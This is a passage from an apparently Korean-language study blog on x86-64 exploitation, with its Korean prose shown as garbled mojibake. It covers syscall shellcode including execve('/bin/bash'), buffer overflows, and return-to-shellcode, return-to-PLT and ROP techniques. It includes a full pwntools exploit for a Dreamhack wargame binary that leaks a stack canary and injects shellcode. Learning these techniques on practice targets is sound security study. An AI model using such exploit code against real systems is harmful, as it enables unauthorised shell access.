</code></pre></li></ul></li><li><p>write</p><ul><li>write ëª…ë ¹ì€ <code>write(FILE_DESCRIPTOR, buf, size)</code> í˜•íƒœì´ë‹¤.</li><li>write ëª…ë ¹ì„ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„í•˜ë©´<ol><li><code>rdi</code> ì— FILE_DESCRIPTOR ê°’ì„ ëŒ€ì…í•œë‹¤. stdoutìœ¼ë¡œ ì¶œë ¥ì„ í•˜ë ¤ë©´ 0x01ì„ ì ìš©í•œë‹¤.</li><li><code>rsi</code> ì™€ <code>rdx</code> ëŠ” read ì—ì„œ ì‚¬ìš©í•œ ê°’ê³¼ ë™ì¼í•œ ê°’ì„ ì ìš©í•œë‹¤.</li><li>write ì— í•´ë‹¹í•˜ëŠ” ì‹œìŠ¤í…œì½œ ë²ˆí˜¸ 1ì„ <code>rax</code> ì— ëŒ€ì…í•œë‹¤.</li></ol></li><li>ex) write(fd, buf, 10) ì€ ì•„ë˜ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„ëœë‹¤.<pre tabindex=0><code>mov rdi, 1        ; (1) rdi = 1 ; fd = stdout
                  ; rsi rdx ê°’ì€ readì™€ ë™ì¼í•œ ê°’ ì‚¬ìš©, ë³„ë„ ì„¤ì • ì•ˆí•¨
mov rax, 0x1      ; (3) rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x0A)
</code></pre></li></ul></li></ol><ul><li>shell codeëŠ” ì–´ì…ˆë¸”ë¦¬ í˜•íƒœì´ë¯€ë¡œ ê¸°ê³„ì–´ë¡œ ì»´íŒŒì¼ í•´ì„œ ì‚¬ìš© ê°€ëŠ¥í•˜ì§€ë§Œ, ì‹¤í–‰ë  ê¸°ê¸°ì˜ os, cpuì— ë”°ë¼ ë‹¤ë¥¸ ë°©ë²•ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.</li><li>shell codeë¥¼ ë™ì‘ì‹œí‚¤ê¸° ìœ„í•´ skeleton codeì— shell codeë¥¼ ì‚½ì…í•˜ì—¬ ì»´íŒŒì¼ í•˜ëŠ” ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.<ul><li>skeleton codeë€, ì•„ë¬´ëŸ° ë™ì‘ë„ í•˜ì§€ ì•ŠëŠ” ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±ëœ ì½”ë“œë¡œ, ì»´íŒŒì¼ì´ ê°€ëŠ¥í•˜ë‹¤.</li><li>ë§ˆì¹˜ Cì–¸ì–´ì—ì„œ <code>void main(void) { return 0 }</code> ë¥¼ ì»´íŒŒì¼ í•˜ëŠ” ê²ƒê³¼ ê°™ë‹¤.</li><li>Cì–¸ì–´ë¡œ ì‘ì„±ëœ skeleton codeì˜ ì˜ˆì‹œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.</li></ul><pre tabindex=0><code>  // ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±í•œ &#39;assem_code&#39; í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” íŒŒì¼
  __asm__(
      &#34;.global assem_code\n&#34;
      &#34;assem_code:\n&#34;

      # ì—¬ê¸°ì— ì›í•˜ëŠ” assembly codeë¥¼ ì§‘ì–´ë„£ëŠ”ë‹¤.
      # ì–´ì…ˆë¸”ë¦¬ ì½”ë“œëŠ” ë¼ì¸ë§ˆë‹¤ ë§ˆì§€ë§‰ì— &#39;\n&#39; ê°€ ë¶™ì–´ì•¼ í•¨ì— ì£¼ì˜í•œë‹¤.

      &#34;xor rdi, rdi   # rdi = 0\n&#34;
      &#34;mov rax, 0x3c	# rax = sys_exit\n&#34;
      &#34;syscall        # exit(0)&#34;
  );

  void assem_code();

  int main() { assem_code(); }
</code></pre></li></ul><h3 id=execve>execve<a hidden class=anchor aria-hidden=true href=#execve>#</a></h3><ul><li>execve() ëŠ” Linux kernel ë ˆë²¨ì˜ í•¨ìˆ˜ë¡œ, íŠ¹ì • í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” í•¨ìˆ˜ì´ë‹¤.</li><li><code>execve("/bin/bash", NULL, NULL)</code> ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë˜ë©´ ì‰˜ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ì–»ì€ ê²ƒì´ë‹¤.</li><li>execveëŠ” <code>execve(FILE_NAME, argv, envp)</code> í˜•íƒœë¡œ ì‹¤í–‰ë˜ë©°, FILE_NAMEì€ ì‹¤í–‰í•  í”„ë¡œê·¸ë¨ ê²½ë¡œ, argvëŠ” ì¸ì, envpëŠ” í™˜ê²½ë³€ìˆ˜ì— í•´ë‹¹í•œë‹¤.</li><li>execveë¥¼ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„í•˜ë©´<ol><li>ìŠ¤íƒì— &lsquo;/bin/bash&rsquo; ë¥¼ ë„£ê³  <code>rdi</code>ì— ê·¸ ì£¼ì†Œë¥¼ ëŒ€ì…í•œë‹¤.</li><li><code>rsi</code>ì™€ <code>rdx</code>ëŠ” NULLì´ë¯€ë¡œ 0ì„ ëŒ€ì…í•œë‹¤.</li><li>execveëŠ” ì‹œìŠ¤í…œì½œ ë²ˆí˜¸ 0x3Bì— í•´ë‹¹í•˜ë¯€ë¡œ <code>rax</code>ëŠ” 0x3Bê°€ ì ìš©ëœë‹¤.</li></ol><pre tabindex=0><code>  push 0x68
  mov rax, 0x7361622f6e69622f
  push rax
  mov rdi, rsp  ; (1) rdi = &#34;/bin/bash&#34;
  xor rsi, rsi  ; (2) rsi = NULL
  xor rdx, rdx  ; (2) rdx = NULL
  mov rax, 0x3b ; (3) rax = execve
  syscall       ; execve(&#34;/bin/bash&#34;, null, null)
</code></pre></li></ul><h3 id=buffer-overflow>buffer overflow<a hidden class=anchor aria-hidden=true href=#buffer-overflow>#</a></h3><ul><li>í”„ë¡œê·¸ë¨ì— ì…ë ¥ì„ ìœ„í•´ ì§€ì •ëœ ë²„í¼ë¥¼ ì´ˆê³¼í•˜ì—¬ ì…ë ¥ê°’ì„ ì§‘ì–´ë„£ì–´ ë²„í¼ ë‹¤ìŒì— í• ë‹¹ëœ ë©”ëª¨ë¦¬ì˜ ê°’ì„ ë®ì–´ì“°ëŠ” í–‰ìœ„</li><li><code>scanf("%s",buf)</code>ëŠ” ì…ë ¥ê°’ì˜ ê°¯ìˆ˜ ì œí•œì´ ì—†ê¸° ë•Œë¬¸ì— buffer overflowì— ì·¨ì•½í•˜ë¯€ë¡œ ì ˆëŒ€ ì‚¬ìš©í•˜ë©´ ì•ˆë˜ëŠ” í˜•íƒœ ì¤‘ í•˜ë‚˜ì´ë‹¤.<ul><li>scanfì™€ ìœ ì‚¬í•˜ê²Œ strcpy, strcat, sprintf ë„ ê¸¸ì´ì— ì œì•½ì´ ì—†ëŠ” í•¨ìˆ˜ë¡œ, ëŒ€ì‹  strncpy, strncat, snprintf, fgets, memcpy ë¥¼ ì‚¬ìš©í•˜ëŠ”ê²ƒì´ ê¶Œì¥ëœë‹¤.</li></ul></li><li>C ê³„ì—´ ì–¸ì–´ì—ì„œ ë¬¸ìì—´(string)ì„ ì²˜ë¦¬í•  ë•Œ ë¬¸ìì—´ì˜ ì¢…ê²°ì„ null(&rsquo;\0&rsquo;) ë¬¸ìë¡œ íŒë‹¨í•˜ëŠ”ë°, ë¬¸ìì—´ ëì— nullì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš° ë¬¸ìì—´ë³´ë‹¤ ë” ë’·í¸ì˜ ì£¼ì†Œë¥¼ ì°¸ì¡°í•˜ê²Œ ë  ìˆ˜ ìˆê³ , ì´ë¥¼ OOB(out of boundary) ì·¨ì•½ì ì´ë¼ í•œë‹¤.</li></ul><h3 id=ropreturn-oriented-programming>ROP(Return Oriented Programming)<a hidden class=anchor aria-hidden=true href=#ropreturn-oriented-programming>#</a></h3><ul><li>gadget ì´ë€ ì–´ì…ˆë¸”ë¦¬ì–´ì—ì„œ ret ëª…ë ¹ì–´ ì•ì— ì˜¤ëŠ” ì½”ë“œ ì¡°ê°ìœ¼ë¡œ ì½”ë“œì˜ ì‹¤í–‰ì„ ì œì–´í•œë‹¤.</li><li>gadget ì„ ì‚¬ìš©í•˜ì—¬ í•¨ìˆ˜ì˜ í˜¸ì¶œ í˜¹ì€ ì¸ìë¥¼ ì¡°ì‘í•˜ëŠ” ê³µê²© ë°©ì‹ì„ ROPë¼ í•œë‹¤.</li><li>payloadë¥¼ return gadget(ë¦¬í„´ ê°€ì ¯) ìœ¼ë¡œ ì±„ì›Œì§€ê¸°ì— <code>ROP chain</code> ì´ë¼ê³ ë„ í•œë‹¤.</li></ul><h4 id=return-to-shellcode>Return to Shellcode<a hidden class=anchor aria-hidden=true href=#return-to-shellcode>#</a></h4><ul><li>buffer overflowë¥¼ í†µí•´ ë²„í¼ì— shell í•¨ìˆ˜ ì‹¤í–‰ ì½”ë“œë¥¼ ì‚½ì…í•˜ê³  STL ì—ì„œ return ì£¼ì†Œë¥¼ í•´ë‹¹ ë²„í¼ì˜ ì£¼ì†Œë¡œ ì¹˜í™˜í•˜ì—¬ shell codeë¥¼ ì‹¤í–‰í•˜ëŠ” í•´í‚¹ ê¸°ë²•</li><li><a href=https://dreamhack.io/wargame/challenges/352>ë¬¸ì œ</a> í’€ì´ ì˜ˆì‹œ<pre tabindex=0><code>from pwn import *

def slog(n, m): return success(&#39;: &#39;.join([n, hex(m)]))

p = process(&#39;./r2s&#39;)
#p = remote(&#34;host3.dreamhack.games&#34;, &#34;11171&#34;)

context.arch = &#39;amd64&#39;

# [1] Get information about buf
p.recvuntil(b&#39;Address of the buf: &#39;)
buf = int(p.recvline()[:-1], 16) # remote &#39;\n&#39;
slog(&#39;Address of buf&#39;, buf)

p.recvuntil(b&#39;buf and $rbp: &#39;)
buf2sfp = int(p.recvline().split()[0]) # another way to remove &#39;\n&#39;
buffer_to_canary = buf2sfp - 8 # canary is in rbp+8, so buf + buffer_to_canary - 8 is address of canary
slog(&#39;buf &lt;=&gt; sfp&#39;, buf2sfp)
slog(&#39;buf &lt;=&gt; canary&#39;, buffer_to_canary)

# [2] Leak canary value
payload = b&#39;A&#39;*(buffer_to_canary + 1) # (+1) because of the first null-byte

p.sendafter(b&#39;Input:&#39;, payload)
p.recvuntil(payload)
canary = b&#39;\x00&#39;+p.recvn(7)
slog(&#39;Canary&#39;, u64(canary))

# [3] Exploit
shell_code = asm(shellcraft.sh())
print(&#39;Length of Shell Code:&#39; , len(shell_code))
payload = shell_code.ljust(buffer_to_canary, b&#39;A&#39;) + canary + b&#39;B&#39; * 0x8 + p64(buf)
# ë²„í¼ì— ì‰˜ ì½”ë“œë¥¼ ë„£ê³ , ë‚¨ëŠ” ê³µë°±ì€ ì•„ë¬´ ë¬¸ìë¡œ ë©”ê¾¼ë‹¤. ê·¸ í›„ ì¹´ë‚˜ë¦¬ë¥¼ ì˜ ë®ê³  SFPëŠ” ì•„ë¬´ ìˆ«ìë‚˜ ì±„ì›Œë„£ê³  ë¦¬í„´ ì£¼ì†Œë¥¼ ë²„í¼ ì£¼ì†Œë¡œ ë®ì–´ì”€
# gets() receives input until &#39;\n&#39; is received
p.sendlineafter(b&#39;Input:&#39;, payload)                                                                                                                                                                              
p.interactive()
</code></pre></li></ul><h4 id=return-to-library>Return To Library<a hidden class=anchor aria-hidden=true href=#return-to-library>#</a></h4><ul><li>NXë¥¼ í†µí•´ íŠ¹ì • ë²„í¼ì˜ ì‹¤í–‰ì„ ë§‰ì libraryì˜ ì½”ë“œë¥¼ ì‹¤í–‰ì‹œì¼œì„œ ì‰˜ ê¶Œí•œì„ ì–»ëŠ” ë°©ì‹ì˜ í•´í‚¹ ê¸°ë²•</li><li>ë¦¬ëˆ…ìŠ¤ì˜ <code>libc</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>system</code>, <code>execve</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì´ ëŒ€í‘œì ì´ë‹¤.</li></ul><h4 id=return-to-plt>Return to PLT<a hidden class=anchor aria-hidden=true href=#return-to-plt>#</a></h4><ul><li>ASLR ê¸°ë²•ì´ ì ìš©ë˜ì–´ë„ PLTì˜ ì£¼ì†ŒëŠ” ê³ ì •ë˜ì–´ ìˆìŒì„ ì´ìš©í•œ ê³µê²© ë°©ë²• ìœ¼ë¡œ, PIE ê¸°ë²•ì„ ì ìš©í•˜ë©´ Return to PLT ê³µê²©ì„ ì˜ˆë°©í•  ìˆ˜ ìˆë‹¤.</li><li>system í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ê³ , canaryê°€ ìœ ì¶œë˜ëŠ” ì½”ë“œë¼ë©´ ì•„ë˜ ì ˆì°¨ë¡œ ì‰˜ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤.<ol><li><code>system()</code> ì´ í˜¸ì¶œ ë  ë•Œ rdi ë¥¼ ë°˜í™˜í•˜ëŠ” ìœ„ì¹˜ë¥¼ ì°¾ëŠ”ë‹¤. rdi ê°’ì„ &ldquo;/bin/sh"ë¡œ ì„¤ì •í•˜ê²Œ ëœë‹¤ë©´ system("/bin/sh&rdquo;), ì¦‰ ì‰˜ì„ ì‹¤í–‰í•˜ê²Œ ë˜ëŠ” ê²ƒì´ë‹¤.</li></ol><ul><li>ROPgadget ì„ ì‚¬ìš©í•˜ì—¬ <code>pop rdi</code> êµ¬ë¬¸ì˜ ì£¼ì†Œë¥¼ ì°¾ëŠ”ë‹¤. (ì—¬ëŸ¬ ê°œ ìˆë‹¤ë©´ ì´ì¤‘ system() í•¨ìˆ˜ì˜ ìœ„ì¹˜ë¥¼ íŠ¹ì •í•´ì•¼ í•œë‹¤.)</li><li><code>ROPgadget --binary BINARY_FILE_PATH --re pop rdi</code> ë¥¼ ì…ë ¥í•˜ë©´ BINARY_FILE_PATH ê²½ë¡œì˜ ë°”ì´ë„ˆë¦¬ì—ì„œ &lsquo;pop rdi&rsquo; êµ¬ë¬¸ì´ ë“¤ì–´ìˆëŠ” gadgetë“¤ì„ ì¶œë ¥í•œë‹¤.</li></ul><ol start=2><li><code>/bin/sh</code> ë¬¸ìì—´ì´ ì €ì¥ëœ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤.</li></ol><ul><li>gdbë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰ì‹œí‚¨ í›„ <code>search /bin/sh</code> ëª…ë ¹ìœ¼ë¡œ í™•ì¸ ê°€ëŠ¥í•˜ë‹¤.</li></ul><ol start=3><li><code>system</code> í•¨ìˆ˜ì˜ PLT ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤.</li></ol><ul><li>gdbë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰ì‹œí‚¨ í›„ <code>plt</code> ëª…ë ¹ìœ¼ë¡œ <code>system@plt</code> ê°’ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤. (<code>info func system@plt</code> ëª…ë ¹ë„ ê°€ëŠ¥)</li></ul><ol start=4><li>ë¦¬í„´ ê°€ì ¯ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤.</li></ol><ul><li><code>ROPgadget --binary BINARY_FILE_PATH --re ret</code> ëª…ë ¹ì¤‘ ret ê°€ ë‹¨ë…ìœ¼ë¡œ ìˆëŠ” ë¼ì¸(ë¦¬í„´ ê°€ì ¯)ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤.</li><li><code>system()</code> í•¨ìˆ˜ëŠ” ë‚´ë¶€ì—ì„œ movaps í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ”ë°, x64 í™˜ê²½ì—ì„œ ì´ í•¨ìˆ˜ëŠ” ìŠ¤íƒì—ì„œ ê°’ì„ ì½ì–´ì˜¬ ë•Œ 16ë°”ì´íŠ¸ë¡œ ì •ë ¬ë˜ëŠ”ì§€ í™•ì¸í•˜ê³ , 16ë°”ì´íŠ¸ë¡œ ë¬¶ì–´ì§€ì§€ ì•ŠëŠ”ë‹¤ë©´ exceptionì„ ë°œìƒì‹œì¼œ segment faultì„ ìœ ë°œí•œë‹¤.</li><li>ì´ë¥¼ &lsquo;ë¦¬í„´ ê°€ì ¯&rsquo;ì„ ìŠ¤íƒì— ì§‘ì–´ë„£ì–´ 8ë°”ì´íŠ¸ë¥¼ ì¶”ê°€í•˜ì—¬ 16ë°”ì´íŠ¸ë¥¼ ë§ì¶˜ë‹¤.<ul><li>exploitì„ í™œìš©í•´ A ì£¼ì†Œë²ˆì§€ë¥¼ ìŠ¤íƒí”„ë ˆì„ì— return code ì˜ì—­ì— ë„£ìœ¼ë ¤ í•  ë•Œ, ì•„ë˜ì™€ ê°™ì´ return code ìë¦¬ì— ì§ì ‘ A ì£¼ì†Œë¥¼ ì§‘ì–´ë„£ì–´ë„ ë˜ì§€ë§Œ,<pre tabindex=0><code>canary
---------- rbp
SFP
---------- rbp + 0x8
return code   &lt;-- A ì£¼ì†Œ ì£¼ì…
---------- rbp + 0x10
</code></pre></li><li>ì•„ë˜ ê·¸ë¦¼ê³¼ ê°™ì´ return code ìë¦¬ì— ë¦¬í„´ ê°€ì ¯ì„ ì£¼ì…í•´ë„ ëœë‹¤.<pre tabindex=0><code>canary
---------- rbp
SFP
---------- rbp + 0x8
return code &lt;-- ë¦¬í„´ ê°€ì ¯ ì£¼ì…  
---------- rbp + 0x10
???????     &lt;-- A ì£¼ì†Œ ì£¼ì…
</code></pre></li><li>ë¦¬í„´ê°€ì ¯ <code>ret</code> ëŠ” <code>pop rip; jmp rip</code> ì™€ ê°™ì€ íš¨ê³¼ì´ê³ , ì´ëŠ” ê²°êµ­ rbp + 0x10 ìœ„ì¹˜ì— ìˆëŠ” A ì£¼ì†Œë¥¼ ì‹¤í–‰í•˜ê²Œ ë˜ì–´ ì²«ë²ˆì§¸ ì½”ë“œì™€ ë™ì‘ì„±ì€ ê°™ë‹¤.</li><li>ë‹¤ë§Œ, return code ìë¦¬ë³´ë‹¤ 8byte ì•„ë˜ìª½ ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ê²Œ ëœë‹¤.</li></ul></li><li><a href=https://ropemporium.com/guide.html>MOVAPS ê´€ë ¨ ì°¸ì¡° í˜ì´ì§€</a></li></ul><ol start=5><li>buffer overflowë¥¼ í™œìš©í•´ <code>canary</code>ë¥¼ ë³µêµ¬í•˜ê³ , SFPë¥¼ ì•„ë¬´ ê°’ìœ¼ë¡œ ì±„ìš´ë‹¤.</li><li><code>return code</code> ë¦¬í„´ ê°€ì ¯ìœ¼ë¡œ ì±„ì›Œ rbp+0x10ì˜ ì£¼ì†Œì— ìˆëŠ” ì½”ë“œê°€ ì‹¤í–‰ë˜ë„ë¡ í•œë‹¤. (system í•¨ìˆ˜ì˜ movaps ì— ëŒ€ì‘í•˜ê¸° ìœ„í•¨)</li><li>rbp + 0x10 ì£¼ì†Œë¥¼ <code>pop rdi</code> ê°€ì ¯ìœ¼ë¡œ ì±„ìš°ê³ , (2)ì—ì„œ ì°¾ì€ <code>/bin/sh</code> ì£¼ì†Œë¥¼ ì§‘ì–´ë„£ê³ , (3) ì—ì„œ ì°¾ì€ <code>system</code> í•¨ìˆ˜ì˜ plt ì£¼ì†Œë¥¼ ê·¸ ë‹¤ìŒì— ì§‘ì–´ë„£ëŠ”ë‹¤.</li></ol><ul><li>ì—¬ê¸°ê¹Œì§€ ìˆ˜í–‰í•˜ë©´ ìŠ¤íƒì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</li></ul><pre tabindex=0><code>   canary
   ---------- rbp
   SFP   &lt;-- ëœë¤ê°’ ì£¼ì…
   ---------- rbp + 0x8
   return code &lt;-- ë¦¬í„´ ê°€ì ¯ ì£¼ì…  
   ---------- rbp + 0x10
   ???????     &lt;-- pop rdi ê°€ì ¯ ì£¼ì…
   ---------- rbp + 0x18
   ???????     &lt;-- &#34;/bin/sh&#34; string ì£¼ì†Œ ì£¼ì…
   ---------- rbp + 0x20
   ???????     &lt;-- system() í•¨ìˆ˜ plt ì£¼ì†Œ ì£¼ì…
   ```
</code></pre></li></ul><h4 id=return-oriented-programming>Return Oriented Programming<a hidden class=anchor aria-hidden=true href=#return-oriented-programming>#</a></h4><ul><li>ì•ì„œ ì‚´í´ë³¸ <code>Return to ~</code> ê³µê²©ì€ ì¼ë¶€ ë°©ì–´ ê¸°ë²•ì´ ë¹ ì ¸ìˆì„ ë•Œ ì‚¬ìš©í•  ìˆ˜ ìˆì—ˆë‹¤.</li><li>ì¹´ë‚˜ë¦¬, NX, ASLRì´ ëª¨ë‘ ì ìš©ë˜ì–´ ìˆì–´ë„, í”„ë¡œê·¸ë¨ì— buffer overflow ì·¨ì•½ì ì„ í†µí•´ exploit ì„ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë³¸ë‹¤.</li><li><code>NX</code> ë³´í˜¸ê¸°ë²• ë•Œë¬¸ì— ì½”ë“œë¥¼ ì§ì ‘ ë²„í¼ì— ì‘ì„±í•˜ê³  ì‹¤í–‰ì‹œí‚¬ìˆ˜ ì—†ê¸°ì— &ldquo;Return To Library&rdquo; ì—ì„œì²˜ëŸ¼ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>system</code> í•¨ìˆ˜ì™€ <code>"/bin/sh"</code> ë¬¸ìì—´ì„ ì‚¬ìš©í•˜ì—¬ <code>system("/bin/sh")</code> ë¥¼ ë™ì‘ì‹œí‚¤ëŠ” ê²ƒì„ ìµœì¢… ëª©í‘œë¡œ í•œë‹¤.</li></ul><ol><li><p>stack canary ì£¼ì†Œ í™•ì¸</p><ul><li><code>printf</code>, <code>write</code>, <code>puts</code> ë“± ë²„í¼ë¥¼ ì¶œë ¥í•˜ëŠ” í•¨ìˆ˜ì˜ ë²„í¼ë¥¼ overflow ì‹œì¼œ rbp-0x08 ì— ìœ„ì¹˜í•œ canaryë¥¼ í™•ì¸í•œë‹¤.<ul><li><a href=../../assembly/assembly_basic/#%EC%8A%A4%ED%83%9D%ED%94%84%EB%A0%88%EC%9E%84>stack ì°¸ì¡°</a></li></ul></li></ul></li><li><p>system() í•¨ìˆ˜ ì£¼ì†Œ í™•ì¸</p><ul><li><code>libc.so.6</code> ì— ì •ì˜ëœ <code>system</code> í•¨ìˆ˜ì˜ ìœ„ì¹˜ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— í¬í•¨ëœ <code>read</code>, <code>puts</code>, <code>printf</code> ë“±ì˜ í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì–´ <code>GOT</code> ì— ì €ì¥ë˜ì—ˆëŠ”ì§€ í™•ì¸í•œë‹¤.</li><li>ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ í•¨ìˆ˜ê°€ í•˜ë‚˜ë¼ë„ í˜¸ì¶œë˜ì—ˆë‹¤ë©´, ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ ì „ì²´ê°€ ë¡œë“œ ë˜ê¸° ë•Œë¬¸ì— <code>syetem</code> í•¨ìˆ˜ë„ ë©”ëª¨ë¦¬ì— ì ì¬ ë¨ì´ ë³´ì¥ëœë‹¤.</li><li><a href=../../computerscience/computer_science/#plt--got>PLT/GOT ì°¸ì¡°</a></li><li>ASLRì„ í†µí•´ ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ì˜ ì ì¬ ìœ„ì¹˜ë¥¼ ëœë¤í™” ì‹œì¼°ì§€ë§Œ, ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ ë‚´ë¶€ì˜ í•¨ìˆ˜ ìœ„ì¹˜ëŠ” ëœë¤í™” ì‹œí‚¤ì§€ ëª»í•œë‹¤.</li><li>ì¦‰, <code>libc</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „ì´ ê°™ë‹¤ë©´ ì‹¤í–‰ëœ í”„ë¡œê·¸ë¨ì˜ ë©”ëª¨ë¦¬ ìƒì— ë¡œë”©ëœ <code>puts</code> í•¨ìˆ˜ì˜ ì£¼ì†Œì™€ <code>system</code> í•¨ìˆ˜ì˜ ì£¼ì†Œìƒ ê±°ë¦¬ëŠ” í•­ìƒ ì¼ì¹˜í•œë‹¤ëŠ” ê²ƒì´ë‹¤.</li><li>ì´ ì ì„ ì´ìš©í•˜ì—¬ (1) <strong>libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ì‹œì‘ ì£¼ì†Œ(libc_base)</strong> ì™€ (2) <strong>system í•¨ìˆ˜ì˜ offset</strong> ì„ ì•Œ ìˆ˜ ìˆë‹¤ë©´ system í•¨ìˆ˜ì˜ í˜¸ì¶œì´ ê°€ëŠ¥í•˜ë‹¤.</li></ul><ol><li><p>libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ì‹œì‘ ì£¼ì†Œ(libc_base) í™•ì¸</p><ul><li>gotì— ë¡œë“œ ëœ libc í•¨ìˆ˜ì˜ ì£¼ì†Œì™€ í•´ë‹¹ í•¨ìˆ˜ì˜ offset ì„ ë¹¼ë©´ libc_base ì£¼ì†Œë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.<ul><li>libc_base ëŠ” ë§ˆì§€ë§‰ ë°”ì´íŠ¸ê°€ í•­ìƒ 00 ìœ¼ë¡œ ëë‚˜ëŠ” íŠ¹ì§•ì´ ìˆë‹¤.</li></ul></li></ul><ol><li><p>linux ëª…ë ¹ì–´ + gdb ì‚¬ìš©</p><ul><li>ë¦¬ëˆ…ìŠ¤ ì‰˜ì—ì„œ <code>ldd /bin/bash</code> ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ libc ì˜ ê²½ë¡œë¥¼ í™•ì¸í•œë‹¤.<ul><li>ex)<pre tabindex=0><code>linux-vdso.so.1 (0x00007ffff8cd0000)
libtinfo.so.6 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f0d65a90000)
libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0d65a80000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d65880000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0d65c01000)
</code></pre></li><li>í˜¹ì€ <code>getconf -a | grep libc</code> ëª…ë ¹ì–´ë¡œë„ libc ë²„ì „ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul></li><li>í™•ì¸ëœ libc íŒŒì¼ ê²½ë¡œë¥¼ <code>readelf</code> ëª…ë ¹ì–´ë¡œ ë¶„ì„í•˜ì—¬ ë‚´ë¶€ í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤.<ul><li><code>readelf -s /lib/x86_64-linux-gnu/libc.so.6</code><pre tabindex=0><code>92: 0000000000083970   448 FUNC    WEAK   DEFAULT   15 gets@@GLIBC_2.2.5
430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
942: 000000000010e1e0   153 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
</code></pre></li><li>ELF ìƒ system í•¨ìˆ˜ì˜ offsetì´ 0x0000000000052290 ì„ì„ ì•Œìˆ˜ ìˆë‹¤.</li></ul></li><li><code>gdb</code> ì‹¤í–‰ í›„ <code>p system</code> ìœ¼ë¡œ got ì— ì €ì¥ëœ system í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.<ul><li>ex)<pre tabindex=0><code># p system
$1 = {int (const char *)} 0x7ffff7e1d290 &lt;__libc_system&gt;
# p puts
$2 = {int (const char *)} 0x7ffff7e4f420 &lt;__GI__IO_puts&gt;
</code></pre></li></ul></li><li>got ìƒ ì£¼ì†Œì—ì„œ offsetì„ ë¹¼ë©´ libc_base ì£¼ì†Œë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.<ul><li>system í•¨ìˆ˜: 0x7ffff7e1d290 - 0x0000000000052290 = 0x7FFFF7DCB000</li><li>puts í•¨ìˆ˜: 0x7ffff7e4f420 - 0x0000000000084420 = 0x7FFFF7DCB000</li><li>libc_baseì˜ ì£¼ì†Œê°€ 0x7FFFF7DCB000 ì´ë©°, ì–´ë–¤ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ë„ ê³„ì‚° ê²°ê³¼ê°€ ê°™ì€ ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</li></ul></li></ul></li><li><p>pwntool ì‚¬ìš©</p><ul><li><p>libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ELFë¥¼ í™•ì¸í•œë‹¤.</p><pre tabindex=0><code>from pwn import *

libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
offset_read = libc.symbols[&#39;read&#39;]
